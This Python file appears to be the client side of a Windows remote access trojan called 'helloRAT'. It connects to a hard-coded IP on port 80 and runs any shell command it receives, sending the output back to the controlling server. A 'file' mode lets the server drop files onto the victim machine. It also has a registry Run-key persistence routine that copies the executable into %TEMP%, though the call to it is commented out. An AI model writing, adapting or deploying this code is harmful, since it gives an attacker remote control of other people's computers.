#!/usr/bin/python           # This is client.py file
import socket
import sys, base64, os, socket, subprocess
from winreg import *
import sys, os, subprocess
import time
from time import ctime

HOST = '10.3.36.160'  # Symbolic name meaning all available interfaces
PORT = 80  # Arbitrary non-privileged port


def autorun(tempdir, file_name, run):
    # Copy executable to %TEMP%:
    os.system('copy %s %s' % (file_name, tempdir))

    # Queries Windows registry for key values
    # Appends autorun key to runkey array
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    run_key = []
    try:
        i = 0
        while True:
            sub_key = EnumValue(key, i)
            run_key.append(sub_key[0])
            i += 1
    except WindowsError:
        pass

    # Set autorun key:
    if 'Adobe ReaderX' not in run_key:
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_ALL_ACCESS)
            SetValueEx(key, 'helloRAT', 0, REG_SZ, r"%TEMP%\helloRAT.exe")
            key.Close()
        except WindowsError:
            pass

def get_autoruns(run):
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    run_key = []
    try:
        i = 0
        while True:
            sub_key = EnumValue(key, i)
            run_key.append(sub_key[0])
            i += 1
    except WindowsError:
        pass
    return run_key

def run_command(cmd):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdoutput = proc.stdout.read() + proc.stderr.read()
    return stdoutput


def recvall(sock):
    data = ""
    part = "asd"
    while str(part) != "":
        part = str(sock.recv(1024))
        data += part
        print(part)
    sock.close()


tempdir = '%TEMP%'
fileName = sys.argv[0]
run = "Software\Microsoft\Windows\CurrentVersion\Run"

'''
#this command open for need autorun
if "helloRAT" not in get_autoruns(run):
    autorun(tempdir, fileName, run)
'''
# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = (HOST, PORT)
print(sys.stderr, 'connecting to %s port %s' % server_address)
sock.connect(server_address)

while True:
    try:
        data = sock.recv(1024)
        if not data:
            break
        print(data)
        received = str(data).split('\'')[1]
        result = bytes(1)
        print("received: " + received)
        if ">>" in received:
            command = received.split('>>', 3)
            print(command)
            if command[1] == "cmd":
                print("command: ", command[2])
                result = run_command(command[2])
                print(result)
                sock.sendall(result)
            elif command[1] == "file":
                file_name = command[2]
                print(file_name)
                f = open("1" + file_name, 'wb')  # open in binary
                print('Downloading: ' + file_name)
                # downloading
                while True:
                    count = 1
                    l = sock.recv(1024)
                    while l != '':
                        if "HELLORATHELLORAT" in str(l):
                            print("The Last")
                            u = l[:-16]
                            f.write(u)
                            print("DONE!")
                            break
                        else:
                            print('continue!', count)
                            count += 1
                            f.write(l)
                            l = sock.recv(1024)
                    break
                f.close()
            '''
            i = 1
            f = open('file_' + str(i)+".pdf", 'wb') #open in binary
            i += 1
            '''
    finally:
        a = 0
sock.close()
